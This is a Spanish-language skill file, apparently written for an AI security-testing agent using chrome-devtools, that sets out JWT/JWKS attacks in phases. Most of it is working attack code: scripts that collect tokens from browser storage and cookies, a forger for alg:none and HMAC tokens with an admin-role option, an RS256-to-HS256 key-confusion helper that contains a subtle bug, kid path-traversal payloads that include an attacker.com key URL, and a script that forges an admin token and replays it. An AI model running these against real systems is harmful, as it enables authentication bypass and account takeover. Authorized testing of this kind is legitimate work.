# Skill: JWT / JWKS Security Analysis

**Categoría:** authentication, token, cryptography
**Metodología base:** OWASP WSTG-AUTHN, JWT Attack Checklist, RFC 7515, RFC 7517
**Cuándo activar:** cuando el target usa JWT (eyJ...) para autenticación, especialmente en /api/* endpoints, cookies, o Authorization headers
**MCP requerido:** `chrome-devtools` (para extracción de tokens del navegador), herramienta JWT-Decode (cli)

---

## Overview de Ataques JWT

| Attack | Técnica | Severidad | Validación Requerida |
|--------|---------|-----------|---------------------|
| alg: none | Remover firma | CRÍTICO | Decodificar y reenviar |
| Algorithm Confusion | RS256 → HS256 con clave pública | CRÍTICO | Obtener clave pública del servidor |
| Key Injection | jku/jwk malicioso | CRÍTICO | Verificar si jku es validado |
| Kid Path Traversal | ../../../etc/passwd como kid | ALTO | Verificar sanitización de kid |
| Weak Secret Brute Force | HS256 con secret débil | ALTO | Solo con herramienta especializada |
| JWKS Manipulation | Agregar key maliciosa | ALTO | Verificar kid en JWKS |
| None Attack con JWK | None + jwk para bypass | CRÍTICO | Verificar si jwk es ignorado |

---

## Fase 0 — Extracción de Tokens

### 0.1 Extraer JWT del Navegador

```javascript
// Buscar JWT en localStorage, sessionStorage, cookies
chrome-devtools_evaluate_script({
  function: `() => {
    const results = {
      localStorage: {},
      sessionStorage: {},
      cookies: document.cookie,
      window_globals: {}
    };

    // localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const val = localStorage.getItem(key);
      if (val && (val.includes('eyJ') || val.includes('JWT'))) {
        results.localStorage[key] = val;
      }
    }

    // sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const val = sessionStorage.getItem(key);
      if (val && (val.includes('eyJ') || val.includes('JWT'))) {
        results.sessionStorage[key] = val;
      }
    }

    // Cookies
    const cookieTokens = document.cookie.split(';')
      .map(c => c.trim().split('='))
      .filter(([k, v]) => v && (v.includes('eyJ') || k.includes('token') || k.includes('jwt')));
    results.cookies = Object.fromEntries(cookieTokens);

    // Window globals
    const tokenKeys = ['token', 'jwt', 'access_token', 'id_token', 'auth_token'];
    for (const key of tokenKeys) {
      if (window[key] && typeof window[key] === 'string' && window[key].startsWith('eyJ')) {
        results.window_globals[key] = window[key];
      }
    }

    return JSON.stringify(results, null, 2);
  }`
})
```

### 0.2 Extraer JWT de Headers Authorization

```javascript
// Ver último Authorization header con Bearer token
chrome-devtools_evaluate_script({
  function: `() => {
    const reqs = window.__fetchInterceptor?.requests || [];
    const authReq = reqs.find(r =>
      r.headers?.authorization?.startsWith('Bearer eyJ') ||
      r.headers?.Authorization?.startsWith('Bearer eyJ')
    );

    if (!authReq) return 'No JWT in captured requests';

    return JSON.stringify({
      url: authReq.url,
      method: authReq.method,
      token: authReq.headers.authorization || authReq.headers.Authorization,
      token_preview: (authReq.headers.authorization || authReq.headers.Authorization)?.substring(0, 50)
    }, null, 2);
  }`
})
```

---

## Fase 1 — Decodificación Básica

### 1.1 Decodificar JWT Header y Payload (sin verificar firma)

```python
# jwt_decode.py
import base64
import json
import sys

def decode_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        return None, None, "Invalid JWT format"

    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        return header, payload, None
    except Exception as e:
        return None, None, str(e)

if __name__ == '__main__':
    token = sys.argv[1] if len(sys.argv) > 1 else input("JWT: ").strip()

    header, payload, error = decode_jwt(token)

    if error:
        print(f"Error: {error}")
    else:
        print("=== HEADER ===")
        print(json.dumps(header, indent=2))
        print("\n=== PAYLOAD ===")
        print(json.dumps(payload, indent=2))

        # Flags de vulnerabilidad
        vulns = []
        if header.get('alg') == 'none':
            vulns.append(("CRITICAL", "Algorithm 'none' - signature bypass"))
        if header.get('alg') == 'HS256':
            vulns.append(("HIGH", "HMAC with shared secret - susceptible to key confusion if server accepts RS256"))
        if 'jku' in header:
            vulns.append(("HIGH", f"External JWK Set URL: {header['jku']}"))
        if 'jwk' in header:
            vulns.append(("CRITICAL", "Inline JWK in token"))
        if header.get('kid'):
            vulns.append(("INFO", f"Key ID: {header['kid']}"))

        if 'exp' not in payload:
            vulns.append(("MEDIUM", "No expiration claim"))
        if 'iat' not in payload:
            vulns.append(("LOW", "No issued-at claim"))
        if 'nbf' not in payload:
            vulns.append(("LOW", "No not-before claim"))

        for severity, msg in vulns:
            print(f"\n[{severity}] {msg}")
```

### 1.2 Análisis Completo de Claims

```python
# jwt_analyze.py
import json
import sys
from datetime import datetime

def analyze_claims(payload):
    findings = []

    # Expiration check
    if 'exp' in payload:
        exp = datetime.fromtimestamp(payload['exp'])
        now = datetime.now()
        if exp < now:
            findings.append(('CRITICAL', f'Token EXPIRED at {exp}'))
        else:
            delta = exp - now
            findings.append(('INFO', f'Expires in {delta}'))
    else:
        findings.append(('HIGH', 'No expiration - token valid forever'))

    # Sensitive data in payload
    sensitive = ['password', 'passwd', 'secret', 'token', 'credit', 'ssn', 'social']
    for key in payload:
        if any(s in key.lower() for s in sensitive):
            findings.append(('HIGH', f'Sensitive claim: {key} = {payload[key]}'[:80]))

    # Role/privilege claims
    priv_claims = ['role', 'roles', 'admin', 'privilege', 'permissions', 'scope', 'access']
    privs = {k: payload[k] for k in payload if k.lower() in priv_claims}
    if privs:
        findings.append(('INFO', f'Privilege claims: {privs}'))

    # Issuer/Audience
    if 'iss' in payload:
        findings.append(('INFO', f'Issuer: {payload["iss"]}'))
    if 'aud' in payload:
        findings.append(('INFO', f'Audience: {payload["aud"]}'))

    # Key ID analysis
    if 'kid' in payload:
        kid = payload['kid']
        if '../' in kid or '..\\' in kid:
            findings.append(('CRITICAL', f'Path traversal in kid: {kid}'))
        if kid.startswith('/') or ':' in kid:
            findings.append(('HIGH', f'kid looks like path: {kid}'))

    return findings

if __name__ == '__main__':
    token = sys.argv[1] if len(sys.argv) > 1 else input("JWT payload (base64): ").strip()

    try:
        # If full token provided, extract payload
        if '.' in token:
            payload_b64 = token.split('.')[1]
            # Add padding
            payload_b64 += '=' * (4 - len(payload_b64) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        else:
            payload = json.loads(base64.urlsafe_b64decode(token + '=='))

        print("=== CLAIM ANALYSIS ===")
        findings = analyze_claims(payload)
        for severity, msg in findings:
            print(f"[{severity}] {msg}")
    except Exception as e:
        print(f"Error: {e}")
```

---

## Fase 2 — Algoritm Confusion (RS256 → HS256)

### 2.1 Extraer Clave Pública del Servidor

```bash
# Obtener clave pública JWKS
curl -s 'https://target/.well-known/jwks.json' | jq .

# O buscar en el token (jku claim)
curl -s 'https://target/api/jwks' | jq .

# Intentar obtener clave pública de login endpoint
curl -s -X POST 'https://target/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","password":"test"}' \
  -v 2>&1 | grep -i 'jwt\|token\|set-cookie'
```

### 2.2 Convertir Clave Pública RSA a HMAC Secret

```python
# jwt_key_confusion.py
import cryptography
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import base64
import json
import sys

def rsa_public_to_hmac_secret(pem_public_key):
    """Convierte clave pública RSA a secret HMAC (para ataque RS256→HS256)"""
    try:
        public_key = serialization.load_pem_public_key(
            pem_public_key.encode(),
            backend=default_backend()
        )

        # Para el ataque RS256→HS256, usamos el módulo 'n' como shared secret
        if isinstance(public_key, rsa.RSAPublicKey):
            numbers = public_key.public_numbers()
            # El "secret" es el módulo n en base64
            n_bytes = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big')
            return base64.b64encode(n_bytes).decode()
    except Exception as e:
        return None, str(e)
    return None, "Could not extract HMAC secret"

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: jwt_key_confusion.py <public_key.pem>")
        sys.exit(1)

    with open(sys.argv[1]) as f:
        pem = f.read()

    secret, error = rsa_public_to_hmac_secret(pem)
    if error:
        print(f"Error: {error}")
    else:
        print(f"=== HMAC SECRET (for HS256 attack) ===")
        print(secret)
        print(f"\nUse this secret to forge tokens with:")
        print(f"python jwt_forge.py --secret {secret} --alg HS256 ...")
```

### 2.3 Forjar Token con Algoritmo Manipulado

```python
# jwt_forge.py
import hmac
import hashlib
import base64
import json
import sys
import argparse

def create_hmac_token(header, payload, secret, algorithm='HS256'):
    """Crea token HS256 con secret especificado"""

    # Codificar header
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()

    # Codificar payload
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()

    # Crear firma
    if algorithm == 'HS256':
        sig = hmac.new(
            secret.encode(),
            f"{header_b64}.{payload_b64}".encode(),
            hashlib.sha256
        ).digest()
    elif algorithm == 'HS384':
        sig = hmac.new(
            secret.encode(),
            f"{header_b64}.{payload_b64}".encode(),
            hashlib.sha384
        ).digest()
    elif algorithm == 'HS512':
        sig = hmac.new(
            secret.encode(),
            f"{header_b64}.{payload_b64}".encode(),
            hashlib.sha512
        ).digest()
    else:
        return None, f"Unsupported algorithm: {algorithm}"

    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

    return f"{header_b64}.{payload_b64}.{sig_b64}", None

def create_none_token(header, payload):
    """Crea token con alg:none"""
    header['alg'] = 'none'
    if 'typ' not in header:
        header['typ'] = 'JWT'

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()

    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()

    return f"{header_b64}.{payload_b64}.", None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='JWT Forgery Tool')
    parser.add_argument('--alg', default='none', help='Algorithm (none, HS256, HS384, HS512)')
    parser.add_argument('--secret', help='HMAC secret')
    parser.add_argument('--header', help='JSON header')
    parser.add_argument('--payload', help='JSON payload')
    parser.add_argument('--kid', help='Key ID')
    parser.add_argument('--role', help='Role to inject')
    parser.add_argument('--admin', action='store_true', help='Add admin role')
    args = parser.parse_args()

    # Parsear header
    if args.header:
        header = json.loads(args.header)
    else:
        header = {"alg": args.alg, "typ": "JWT"}

    if args.kid:
        header['kid'] = args.kid

    # Parsear payload
    if args.payload:
        payload = json.loads(args.payload)
    else:
        payload = {}

    if args.role:
        payload['role'] = args.role

    if args.admin:
        payload['role'] = 'admin'
        payload['is_admin'] = True

    # Generar token
    if args.alg == 'none':
        token, error = create_none_token(header, payload)
    else:
        if not args.secret:
            print("Error: --secret required for HMAC algorithms")
            sys.exit(1)
        token, error = create_hmac_token(header, payload, args.secret, args.alg)

    if error:
        print(f"Error: {error}")
    else:
        print("=== FORGED TOKEN ===")
        print(token)
        print(f"\n=== DECODED ===")
        print(f"Header: {json.dumps(header)}")
        print(f"Payload: {json.dumps(payload)}")
```

---

## Fase 3 — JWKS Manipulation

### 3.1 Analizar JWKS Endpoint

```bash
# Capturar JWKS
curl -s 'https://target/.well-known/jwks.json' | jq .

# Verificar si acepta claves externas
curl -s -X POST 'https://target/api/auth/token' \
  -H 'Content-Type: application/json' \
  -d '{"token":"..."}' -v
```

### 3.2 Detectar Vulnerabilidades JWKS

```python
# jwt_jwks_analyze.py
import json
import sys
import requests

def analyze_jwks(jwks_url):
    findings = []

    try:
        resp = requests.get(jwks_url, timeout=10)
        jwks = resp.json()
    except Exception as e:
        return [('ERROR', f"Could not fetch JWKS: {e}")]

    if 'keys' not in jwks:
        return [('ERROR', "Invalid JWKS: no 'keys' array")]

    for key in jwks['keys']:
        findings.append(('INFO', f"Key: {key.get('kid', 'no kid')}"))
        findings.append(('INFO', f"  Type: {key.get('kty', 'unknown')}"))
        findings.append(('INFO', f"  Use: {key.get('use', 'sig')}"))

        # Vulnerabilidades
        if key.get('alg'):
            findings.append(('INFO', f"  Algorithm: {key['alg']}"))

        # Verificar si acepta "none" en alg
        if key.get('alg') == 'none' or (key.get('kty') == 'oct' and not key.get('k')):
            findings.append(('CRITICAL', f"  VULNERABLE: Key allows 'none' algorithm"))

        # Verificar uso de RSA sin restriction
        if key.get('kty') == 'RSA' and key.get('use') == 'sig':
            # No kid es problemático
            if not key.get('kid'):
                findings.append(('MEDIUM', "  No 'kid' - key selection ambiguous"))
            # Algoritmo no especificado
            if not key.get('alg'):
                findings.append(('MEDIUM', "  No 'alg' specified - server may accept weak algorithms"))

    return findings

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else input("JWKS URL: ").strip()
    findings = analyze_jwks(url)
    for severity, msg in findings:
        print(f"[{severity}] {msg}")
```

---

## Fase 4 — kid Path Traversal

```python
# jwt_kid_path_traversal.py
import base64
import json
import hmac
import hashlib

def create_kid_path_traversal_token(original_header, original_payload, payload_path="/etc/passwd"):
    """Crea token con kid manipulado para path traversal"""

    header = original_header.copy()
    header['kid'] = payload_path

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()

    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(original_payload).encode()
    ).rstrip(b'=').decode()

    # Firma dummy (el servidor puede usar el path como clave)
    sig = b'traversal'
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

    return f"{header_b64}.{payload_b64}.{sig_b64}"

# Payload comunes
kid_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/dev/null",
    "traversal",
    "../../../../../../../../dev/null",
    "http://attacker.com/key.pem"
]

print("=== kid Path Traversal Payloads ===")
for p in kid_payloads:
    print(p)
```

---

## Fase 5 — Integración con Chrome DevTools

### 5.1 Replay con Token Manipulado

```javascript
// Extraer token original y manipular
chrome-devtools_evaluate_script({
  function: `() => {
    const reqs = window.__fetchInterceptor?.requests || [];
    const authReq = reqs.find(r =>
      r.headers?.authorization?.startsWith('Bearer ')
    );

    if (!authReq) return 'No JWT found';

    const token = authReq.headers.authorization.replace('Bearer ', '');
    const parts = token.split('.');

    // Decodificar header
    const header = JSON.parse(atob(parts[0]));
    // Decodificar payload
    const payload = JSON.parse(atob(parts[1]));

    // Manipular: cambiar rol a admin, quitar exp
    payload.role = 'admin';
    payload.is_admin = true;
    delete payload.exp;

    // Re-codificar con alg: none
    const newHeader = { ...header, alg: 'none', typ: 'JWT' };
    const newHeaderB64 = btoa(JSON.stringify(newHeader)).replace(/=/g, '');
    const newPayloadB64 = btoa(JSON.stringify(payload)).replace(/=/g, '');
    const forgedToken = \`\${newHeaderB64}.\${newPayloadB64}.\`;

    // Reenviar con token manipulado
    return fetch(authReq.url, {
      method: authReq.method,
      headers: { ...authReq.headers, authorization: 'Bearer ' + forgedToken },
      body: authReq.body ? JSON.stringify(authReq.body) : undefined
    }).then(r => r.json()).catch(e => ({ error: e.message }));
  }`
})
```

### 5.2 Test de Algoritm Confusion

```javascript
// Test RS256 → HS256
chrome-devtools_evaluate_script({
  function: `() => {
    // Obtener clave pública del servidor
    return fetch('https://target/.well-known/jwks.json')
      .then(r => r.json())
      .then(jwks => {
        const key = jwks.keys?.[0];
        if (!key) return { error: 'No keys in JWKS' };

        // Para RS256→HS256, el "secret" es el módulo n
        // Este es un ejemplo conceptual - la implementación real requiere crypto

        return {
          jwks_url: 'https://target/.well-known/jwks.json',
          key_type: key.kty,
          key_id: key.kid,
          note: 'Use jwt_key_confusion.py con la clave pública para forjar token HS256'
        };
      })
      .catch(e => ({ error: e.message }));
  }`
})
```

---

## Checklist de Cierre

```
[ ] Token(s) extraídos del navegador
[ ] Header y Payload decodificados
[ ] Claims analizados (exp, iat, roles)
[ ] alg:none test: ¿token aceptado sin firma?
[ ] RS256→HS256: ¿clave pública obtenida?
[ ] kid path traversal payloads generados
[ ] JWKS endpoint analizado
[ ] Token manipulado forjado y testeado
[ ] Evidencia de validación (respuesta del servidor)
```

---

## Integración con Team

- **security-scout** → detecta uso de JWT en headers/cookies
- **security-web** → usa este skill para análisis de autenticación JWT
- **security-code** → si encuentra implementación JWT, verificar library y configuración de validación
